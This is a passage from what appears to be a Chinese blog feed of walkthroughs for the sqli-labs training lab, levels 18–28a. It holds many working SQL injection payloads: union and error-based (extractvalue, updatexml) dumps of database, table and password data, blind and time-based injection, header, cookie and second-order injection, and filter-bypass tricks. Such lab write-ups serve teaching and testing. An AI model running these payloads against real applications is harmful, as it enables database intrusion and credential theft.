by后面的字段(名，序号，别名)是不能加引号的，虽然不会报错，但数据库会不执行该语句。</code></pre><p>这关不能使用order by来判断字段数,可以直接使用union进行联合查询</p><pre><code>SELECT * FROM users WHERE id=&#39;1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1&#39; LIMIT 0,11&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1或者SELECT * FROM users WHERE id=&#39;1&#39; union select 1,2,3,4 and &#39;1&#39;=&#39;1&#39; LIMIT 0,11&#39; union select 1,2,3,4 and &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171635708.png" alt="image-20220317163543605">特别注意：这里的or和and作为了联合查询第二select个语句的条件而不是第一个select语句where的条件。</p><p>当 id&#x3D;’1’ union select 1,2,3,4 or ‘1’&#x3D;’1’ LIMIT 0,1 就变成 id&#x3D;’1’ union select 1,2,3,4 or true LIMIT 0,1   </p><pre><code>1.当select 1,2,3,4为真时，原句等于： id=&#39;1&#39; union select 1,2,3,4 LIMIT 0,1 返回我们要查询的结果2.当select 1,2,3,4为假时，原句等于： id=&#39;1&#39; union select true LIMIT 0,1 也就是 id=&#39;1&#39; union select 1 LIMIT 0,1  这个语句必定报错因为第一个select语句中的users表里有3个字段，与union联合查询的第二个select查询的字段数量不一致。</code></pre><p>当 id&#x3D;’1’union select 1,2,3,4 and ‘1’&#x3D;’1’ LIMIT 0,1 就变成 id&#x3D;’1’ union select 1,2,3,4 and true LIMIT 0,1 即 id&#x3D;’1’ union select 1,2,3,4 LIMIT 0,1</p><pre><code>如果select 1,2,3,4为真，原句：id=&#39;1&#39; union select 1,2,3,4 LIMIT 0,1  返回我们的结果如果select 1,2,3,4为假，原句：id=&#39;1&#39; union select 1,2,3,4 LIMIT 0,1  会直接报错，因为两个查询语句的字段数量不一致。</code></pre><p>接着查询返回信息</p><pre><code>-1&#39; union select 1,2,3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171638772.png" alt="image-20220317163845655"></p><p>这里的passwd的1 并不是select 1,2,3中的1,原因是这里的or’1’&#x3D;’1’是作为字段三的逻辑运算符,因为永真条件,在字段三种会回显1,所以字段三是不可以利用的</p><pre><code>爆库:-1&#39; union select 1,database(),3 or &#39;1&#39;=&#39;1爆表:-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1或者-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 and &#39;1&#39;=&#39;1字段:-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1数据:-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users),3 and &#39;1&#39;=&#39;1</code></pre><p>但是这里注意在爆数据的时候，不能在使用and的时候直接查询，必须要用双子注入查询，否则会报错</p><pre><code>select 1,group_concat(username),3 from users and &#39;1&#39;=&#39;1   from和and是不能连在一起用的）</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171645404.png" alt="image-20220317164518297"></p><p>但是也可以这样</p><pre><code>-1&#39; union select 1,group_concat(username),3 from users where 1 and &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171645578.png" alt="image-20220317164552460"></p><p><strong>盲注</strong></p><p>这里盲注就得使用and，而不能使用or   </p><pre><code>1&#39; and left(version(),1)=5 and &#39;1&#39;=&#39;11&#39; and left(version(),1)=6 and &#39;1&#39;=&#39;1and和or同时使用and的优先级高于or,哪怕不考虑优先级也不能使用or,因为 &#39;1&#39;=&#39;1&#39;是永真条件，不管前面查询的条件时真假，到最后都会变成 真条件</code></pre><p><strong>extractvalue</strong></p><pre><code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171648467.png" alt="image-20220317164836367"></p><pre><code>1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or &#39;1&#39;=&#39;1使用逻辑运算符or，按照正常推断该语句是不会报错的应该会正常回显，但结果报错了，说明是extractvalue搞的鬼，至于原理还不是很清楚，所以为了验证特意找了Less-12，看使用and和or是否有区别：</code></pre><p><strong>进阶闭合</strong></p><p>select 1 等同于 select ‘1’</p><pre><code>数据库:-1&#39; union select 1,database(),&#39;3-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#39;3爆表-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;3字段:-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;3数据:-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users),&#39;3</code></pre><h2 id="less-24POST型基于存储的二次注入"><a href="#less-24POST型基于存储的二次注入" class="headerlink" title="less-24POST型基于存储的二次注入"></a>less-24POST型基于存储的二次注入</h2><p>先随便点点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171657674.png" alt="image-20220317165750536"></p><p>登录页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171658674.png" alt="image-20220317165810551"></p><p>创建用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171658564.png" alt="image-20220317165834393"></p><p>不让改密码,让黑了它</p><p>先注册一个用户:username:1 passwd:1</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171659317.png" alt="image-20220317165953156"></p><p>简单分析一下源码可以发现在修改用户名这里,从session中直接获得了用户名,并且直接用于更新语句并未做检查,从根本上来说,插入数据时没有做过滤,只是做了转义处理</p><p>也就是说当前用户中如果含有注释,便可以更改当前用户名中包含的另一用户的密码,例如注册用户:Dumb’– +那么他就可以更改Dumb的密码</p><pre><code class="mysql">UPDATE users SET PASSWORD=&#39;$pass&#39; WHERE username=&#39;1&#39;-- # and password=&#39;$curr_pass&#39;</code></pre><p>这里我们注册用户名为1’– #去更改我们已知的1用户的密码</p><p>这里username:1’– # passwd:2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171707403.png" alt="image-20220317170732295"></p><p>登录进去开始重置1用户的密码</p><p>我们将1 用户的密码改为3</p><p>接着回到登录界面使用username:1 passwd:成功登录进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171709261.png" alt="image-20220317170908116"></p><h2 id="less-25GET-基于错误-您所有的OR＆AND都属于我们"><a href="#less-25GET-基于错误-您所有的OR＆AND都属于我们" class="headerlink" title="less-25GET-基于错误-您所有的OR＆AND都属于我们"></a>less-25GET-基于错误-您所有的OR＆AND都属于我们</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171751956.png" alt="image-20220317175153760"></p><p>返回的页面信息,其中有用户登录的信息,最下面有个提示,你的输入会进行过滤</p><p>先进行闭合测试</p><pre><code>1    正常显示1&#39; version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 1&quot;    正常显示</code></pre><p>可以发现是单引号闭合</p><pre><code>1&#39;-- # 接着注释尝试发现可以正常使用注释</code></pre><p>当输入and 或者 or 时发现有过滤</p><pre><code>1&#39;and 1=1-- #1&#39;or 1=1-- #</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171800903.png" alt="image-20220317180053783"></p><p>查看源码发现过滤信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171801627.png" alt="image-20220317180138532"></p><p>这里可以发现对大小写不敏感 也就是大小写都进行匹配,但是这里只进行了一次过滤,也就是可以双写绕过,因为这里是过滤为空</p><p>基本绕过思路</p><pre><code>一次性的过滤为空:    可以双写绕过非一次行的:    大小写变形绕过      or=Or=oR=OR    利用运算符        or=||  and=&amp;&amp;    url编码绕过        #=%23,hex编码 ~=0x7e    添加注释        /*or*/</code></pre><p>在开始注入之前要说一下,在url中空格和一些特殊字符会进行url编码:#是%23 空格时%20</p><p><strong>双写绕过</strong></p><pre><code>1&#39;oorr 1=1-- #    回显正常</code></pre><p>爆列数</p><pre><code>1&#39; oorrder by 4-- #        Unknown column &#39;4&#39; in &#39;order clause&#39;1&#39; oorrder by 3-- #        回显正常</code></pre><p>查看回显字段位置</p><pre><code>-1&#39; union select 1,2,3-- #    回显2,3</code></pre><pre><code>爆数据库:-1&#39; union select 1,database(),3-- #爆表:-1&#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;security&#39;),3-- #爆字段:-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#39;security&#39; anandd table_name=&#39;users&#39;),3-- #爆数据:-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,passwoorrd)) from users),3-- #</code></pre><p><strong>运算符绕过</strong></p><pre><code>-1&#39; || extractvalue(1,concat(0x7e,database()))-- #1&#39; || extractvalue(1,concat(0x7e,database()))-- #  </code></pre><h2 id="less-25a基于Bool-GET-过滤AND-x2F-OR-数字型-盲注"><a href="#less-25a基于Bool-GET-过滤AND-x2F-OR-数字型-盲注" class="headerlink" title="less-25a基于Bool_GET_过滤AND&#x2F;OR_数字型_盲注"></a>less-25a基于Bool_GET_过滤AND&#x2F;OR_数字型_盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171814700.png" alt="image-20220317181415495"></p><p>测试闭合方式</p><pre><code>1    回显正常1&#39;      mysql_fetch_array() expects parameter 1 to be resource1&quot;     mysql_fetch_array() expects parameter 1 to be resource,</code></pre><p>这里就可以说明是数字性注入</p><p>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入</p><pre><code>-1 || extractvalue(1,concat(0x7e,database()))-- #  </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171816039.png" alt="image-20220317181656940"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171817201.png" alt="image-20220317181727080"></p><p>原因是这里关闭了错误报告</p><pre><code>如果在一个php文件最前面写入函数error_reporting(0)那么，这一个页面将不会返回任何warning（警告）信息，不影响其他php文件</code></pre><h2 id="less-26GET-基于错误-您所有的空格和注释都属于我们"><a href="#less-26GET-基于错误-您所有的空格和注释都属于我们" class="headerlink" title="less-26GET-基于错误-您所有的空格和注释都属于我们"></a>less-26GET-基于错误-您所有的空格和注释都属于我们</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171819784.png" alt="image-20220317181923579"></p><p>这里可以发现过滤了许多字符</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171822107.png" alt="image-20220317182203004"></p><p>不仅过滤了上一关的or与and,还过滤了单行注释–与#(包含url编码)以及多行注释&#x2F;**&#x2F;(被解释为空格,通常用于过滤空格时),还过滤了空格,以及正反斜杠&#x2F;与.</p><p>对于注释和结尾字符我们此处只能利用构造一个’来闭合后面的’;对于空格,有较多的办法:</p><p>空格的url编码替代方法</p><pre><code>%09     TAB水平%0a     新建一行%0c        新建一页%0d        return功能%0b        TAB(垂直)%a0        空格</code></pre><p>暴库：（注：url编码%26是运算符&amp;，下面的%26%26换成运算符||也是可以的，但不能直接用&amp;&amp;，会报错，原理还不清楚，但使用&amp;的url编码%26就不会报错）</p><p>但是这里经过尝试一个都不行</p><p>报错注入试一下</p><pre><code>爆数据库:&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1爆表:&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1爆字段:&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)%26%26(table_name=&#39;users&#39;))),0)||&#39;1&#39;=&#39;1爆数据:&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,passwoorrd))from(users)limit%0b0,1)),0)||&#39;1&#39;=&#39;1</code></pre><p>布尔盲注</p><pre><code>1&#39;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#39;1&#39;=&#39;</code></pre><h2 id="less-26a基于错误-GET-过滤空格-x2F-注释单引号小括号字符型盲注"><a href="#less-26a基于错误-GET-过滤空格-x2F-注释单引号小括号字符型盲注" class="headerlink" title="less-26a基于错误_GET_过滤空格&#x2F;注释单引号小括号字符型盲注"></a>less-26a基于错误_GET_过滤空格&#x2F;注释单引号小括号字符型盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171902898.png" alt="image-20220317190201694"></p><p>在没有过滤时第一件事是判断注入类型,是字符型还是数字型</p><p>而在有过滤时,判断注入类型后最重要的是判断过滤条件</p><p>在less-25与less-26中,即有正确回显,也有错误回显.找到注入类型后再构造的错误回显前加上字符便可依次看出过滤了哪些字符</p><p>在less-25a与less-26a中,错误回显被关闭,找出被过滤的字符很重要,不过大体与有错误回显时相同(毕竟有正确回显)</p><p>我们知道有一个函数是intval(),作用是获取变量的整数值,但是无错误回显时,我们如何区分是被过滤还是被转化为整形呢</p><pre><code>intval(&#39;#1&#39;) = 0intval(&#39;1&#39;) = 1</code></pre><p>只需要在1前面加上#,若被过滤则会正常显示,被转为整形则会显示为0</p><p>注入类型</p><pre><code>id=1    正常id=1&#39;    错误id=1&quot;    正常</code></pre><p>说明这里是单引号闭合,但是还是要判断是否有小括号</p><p>判断小括号的方法</p><pre><code>2&#39; &amp;&amp; &#39;1&#39;=&#39;1 这里浏览器不能使用&amp;要进行url编码即2&#39;%26%26&#39;1&#39;=&#39;1</code></pre><ul><li>若查询语句为where id &#x3D; ‘$id’,查询时是where id&#x3D;’2’&amp;&amp;’1’&#x3D;’1’,结果将是where id&#x3D;’2’,回显会是id&#x3D;2</li><li>若查询语句为where id&#x3D;(‘$id’),查询时是where id&#x3D;(‘2’&amp;&amp;’1’&#x3D;’1’),mysql会将’2’作为布尔值,结果是where id&#x3D;(‘1’),回显会为id&#x3D;1</li></ul><pre><code>1&#39;)||&#39;1&#39;=(&#39;1    若查询语句有小括号正确回显,若无小括号错误回显</code></pre><pre><code>判断字符类型：（带小括号的单引号字符型注入）?id=1&#39;        报错，可初步得出是单引号字符型注入?id=1&#39;||&#39; 和?id=1&#39;||1&#39; 会让我们误判为就是单引号字符型注入，因为带入源码中id=(&#39;1&#39;||&#39;&#39;)和id=(&#39;1&#39;||&#39;1&#39;)返回的结果都会是id=1 所以可以使用下面的语句来快速判断是否带有一个小括号，或者用前面讲的判断是否有小括号的方法也是一样的。?id=1&#39;)||(&#39;           (因为我们过滤了注释，使用这种可以很快的判断出是否是带一个括号的注入点)</code></pre><h2 id="less-27基于错误GET过滤UNION-x2F-SELECT单引号字符型注入"><a href="#less-27基于错误GET过滤UNION-x2F-SELECT单引号字符型注入" class="headerlink" title="less-27基于错误GET过滤UNION&#x2F;SELECT单引号字符型注入"></a>less-27基于错误GET过滤UNION&#x2F;SELECT单引号字符型注入</h2><pre><code>id=1&#39;     version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>​    单引号闭合</p><pre><code>id=2&#39;%26%26 &#39;1&#39;=&#39;1     id=2的用户说明不带括号，id=1的用户说明带括号</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172112819.png" alt="image-20220317211252667"></p><p>到这里我们可以得知,这是单引号字符型注入</p><p>这里查看源码可以发现过滤的字符</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172114296.png" alt="image-20220317211418160"></p><p>发现没有过滤or与and,过滤了几个大小写的union和select但是这里可以使用随机大小写来绕过,过滤了– #&#x2F;**&#x2F;过滤了两次空格,过滤了&#x2F;但是没过滤\</p><p>所以实际上仅仅是过滤了注释和空格,与less-26相似</p><p>这里附上php正则匹配的模式修饰符</p><pre><code>i 如果设定此修正符，模式中的字符将同时匹配大小写字母。m 当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。s 如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。x 如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。e 如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，?在 . + 和 * 之后 表示非贪婪匹配: *、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。</code></pre><p>这关可以直接随机大小写seleCt轻松绕过正则匹配,并且这里可以使用%0a代替空格,但是这里多了一种用&#x2F;<em>%0a</em>&#x2F;强行制造空格.</p><pre><code>爆库:0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1爆表:0&#39;%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;),3||&#39;1爆字段:0&#39;%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&#39;security&#39;%0bAnd%0btable_name=&#39;users&#39;%0b%26%26%0b&#39;1&#39;=&#39;1爆数据:0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws(&#39;$&#39;,id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1</code></pre><h2 id="less-27a基于盲注GET过滤UNION-x2F-SELECT双引号字符型"><a href="#less-27a基于盲注GET过滤UNION-x2F-SELECT双引号字符型" class="headerlink" title="less-27a基于盲注GET过滤UNION&#x2F;SELECT双引号字符型"></a>less-27a基于盲注GET过滤UNION&#x2F;SELECT双引号字符型</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172127387.png" alt="image-20220317212731224"></p><p>贴上源代码</p><ol><li>双引号字符型注入</li><li>没有错误回显,不能进行报错注入,即无法使用updatexml函数等,但是可以进行布尔盲注,因为他有无错误回显,即正确和错误页面返回的页面不同</li><li>可以使用union联合注入,延时注入</li></ol><pre><code>爆数据库:0&quot;%0buniOn%0bsElEct%0b1,database(),3%0bor%0b&quot;1&quot;=&quot;1  </code></pre><h2 id="less-28基于错误的，单引号字符型，过滤了union和select等的注入"><a href="#less-28基于错误的，单引号字符型，过滤了union和select等的注入" class="headerlink" title="less-28基于错误的，单引号字符型，过滤了union和select等的注入"></a>less-28基于错误的，单引号字符型，过滤了union和select等的注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172131134.png" alt="image-20220317213130901"></p><p>单引号报错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172133652.png" alt="image-20220317213313527"></p><p>判断有没有小括号</p><pre><code>2&#39;%26%26&#39;1&#39;=&#39;1        </code></pre><p>正常回显用户1说明有小括号</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172135604.png" alt="image-20220317213515458"></p><ol><li>发现没有过滤or与and</li><li>过滤了相连的union和select,同时匹配大小写,\s匹配任意空白字符如制表符,换行符,空格等,使用%a0等空格的url编码可以绕过</li><li>过滤了– # 以及&#x2F;**&#x2F;</li><li>过滤了&#x2F;但没过滤\</li></ol><pre><code>爆库：?id=0&#39;)%0buniOn%0bsElEct%0b1,database(),3%0bor%0b(&#39;1&#39;)=(&#39;1 爆表:?id=0&#39;)%0buniOn%0bsElEct%0b1,(group_concat(table_name)),3%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;security&#39;%0b%26%26%0b(&#39;1&#39;)=(&#39;1暴字段：?id=0&#39;)%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&#39;security&#39;%0bAnd%0btable_name=&#39;users&#39;%0b%26%26%0b(&#39;1&#39;)=(&#39;1爆数据：?id=0&#39;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#39;1&#39;)=(&#39;1</code></pre><h2 id="less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"></a>less-28a基于盲注的，带括号的单引号字符型，过滤了union和select等的注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172142597.png" alt="image-20220317214215457"></p><p>基本和上一关一致</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilbas靶场记录头部注入(四)</title>
      <link href="/ctf/sql/sql-sqlilbas%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5(%E5%9B%9B)/"/>
      <url>/ctf/sql/sql-sqlilbas%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilbas靶场记录头部注入-四"><a href="#sqlilbas靶场记录头部注入-四" class="headerlink" title="sqlilbas靶场记录头部注入(四)"></a>sqlilbas靶场记录头部注入(四)</h1><h2 id="less-18基于错误的用户代理，头部POST注入"><a href="#less-18基于错误的用户代理，头部POST注入" class="headerlink" title="less-18基于错误的用户代理，头部POST注入"></a>less-18基于错误的用户代理，头部POST注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171508777.png" alt="image-20220317150829690"></p><p>打开之后就会回显ip地址</p><p>使用之前的语句发现都显示登录失败</p><p>注意这一关模拟的是,注册之后登录进去,再进行注入的过程,这里登录进去之后显示user agent</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171515985.png" alt="image-20220317151525903"></p><p><strong>extractvalue()注入</strong></p><pre><code>爆数据库:&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171521157.png" alt="image-20220317152110026"></p><p>这里不使用注释符的原因在于</p><pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code></pre><p>uagent是在IP和uname之前的，如果注释掉后面的语句，会直接导致Insert语句直接异常，达不到我们查询的目的。</p><pre><code>爆表:&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &#39;爆列名：&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  and &#39; 爆列名：&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  and &#39; 数据显示不全：（extractvalue最大爆32位）&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) and &#39; </code></pre><p>同理updatexml()注入（）</p><pre><code>&#39; and updatexml(1,concat(&#39;#&#39;,(database())),0) and &#39;</code></pre><p>注意：这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#。</p><pre><code>数据库:&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0),&#39; &#39;,&#39; &#39;)-- #&#39; and updatexml(1,concat(&#39;#&#39;,(database())),0),&#39; &#39;,&#39; &#39;)-- #爆表：&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;,&#39;&#39;)#爆字段&#39; and updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;,&#39;&#39;)-- #爆数据：&#39; and updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;,&#39;&#39;)-- #使用limit偏移注入依次爆出其他用户和密码。</code></pre><p>子查询注入：</p><pre><code>&#39; and (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from information_schema.tables group by a) b)  and &#39;</code></pre><h2 id="less-19基于头部的Referer-POST报错注入"><a href="#less-19基于头部的Referer-POST报错注入" class="headerlink" title="less-19基于头部的Referer POST报错注入"></a>less-19基于头部的Referer POST报错注入</h2><p>与上一关基本相似</p><pre><code>extractvalue()注入---暴库&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;updatexml()注入--暴表&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;)#&#39; and updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;)#子查询注入---暴字段&#39; and  (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x)a) and &#39;延时注入：&#39; or if(length(database())=8,1,sleep(5))  and &#39;</code></pre><h2 id="less-20基于错误的cookie头部POST注入"><a href="#less-20基于错误的cookie头部POST注入" class="headerlink" title="less-20基于错误的cookie头部POST注入"></a>less-20基于错误的cookie头部POST注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171543824.png" alt="image-20220317154356654"></p><p>登录进去是这个样子的</p><pre><code>登陆后将uname写入Cookie。在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；若不存在…</code></pre><p>cookie注入</p><pre><code>uname=Dumb&#39; </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171547435.png" alt="image-20220317154742304"></p><p>有语法错误</p><pre><code>Cookie: uname=Dumb&#39; order by 4 -- #回显Unknown column &#39;4&#39; in &#39;order clause&#39;</code></pre><pre><code>Cookie: uname=Dumb&#39; order by 3 -- #</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171549174.png" alt="image-20220317154919043"></p><pre><code>Cookie: uname=D2&#39; union select 1,2,3 #</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171550857.png" alt="image-20220317155005730"></p><p>login name和passwd这里有回显</p><pre><code>数据库:Cookie: uname=1&#39; union select 1,2,database() -- #暴表：uname=1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; -- #暴字段：uname=1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; -- #&#39;暴数据：（这两种其实是一样的）uname=1&#39; union select 1,2,group_concat(username,0x7e,password)from security.users -- #uname=1&#39; union select 1,2,group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users# -- #</code></pre><h2 id="less-21基于base64编码单引号和括号的Cookie注入"><a href="#less-21基于base64编码单引号和括号的Cookie注入" class="headerlink" title="less-21基于base64编码单引号和括号的Cookie注入"></a>less-21基于base64编码单引号和括号的Cookie注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171555377.png" alt="image-20220317155528205"></p><p>发现cookie进行了base64编码 RHVtYg&#x3D;&#x3D;   base64解码后：Dumb</p><pre><code>Dumb&#39; or 1=1 --+ 编码后RHVtYicgb3IgMT0xICM=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171558394.png" alt="image-20220317155855260"></p><p>回显sql语句错误</p><pre><code>Dumb&#39;) order by 4-- # 编码RHVtYicpIG9yZGVyIGJ5IDQtLSAj</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171600874.png" alt="image-20220317160059744"></p><pre><code>Dumb&#39;) order by 3-- # 编码 RHVtYicpIG9yZGVyIGJ5IDMtLSAj</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171601396.png" alt="image-20220317160151255"></p><pre><code>1&#39;) union select 1,2,3-- # 编码MScpIHVuaW9uIHNlbGVjdCAxLDIsMy0tICM=</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171602727.png" alt="image-20220317160255593"></p><h2 id="less-22基于错误的双引号字符型Cookie注入"><a href="#less-22基于错误的双引号字符型Cookie注入" class="headerlink" title="less-22基于错误的双引号字符型Cookie注入"></a>less-22基于错误的双引号字符型Cookie注入</h2><p>除了多个”闭合其他和上一关基本一致</p><pre><code>1&quot; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- 